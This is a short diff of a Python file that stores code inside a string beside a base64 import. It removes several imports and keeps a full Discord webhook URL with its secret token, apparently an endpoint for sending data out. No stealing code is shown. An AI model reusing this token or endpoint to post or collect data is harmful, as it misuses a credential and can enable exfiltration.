@@ -1,11 +1,5 @@
 import base64
-
 message = """
-import os
-import re
-import json
-
-from urllib.request import Request, urlopen
 
 # your webhook URL
 WEBHOOK_URL = 'https://discord.com/api/webhooks/823243320759156756/3bhWU7O3fxBZ3c0eNHr2sMvf6_kvszwWZFeAnGe1FHDfSB6w64QmciYFLOrnidTU6X40'
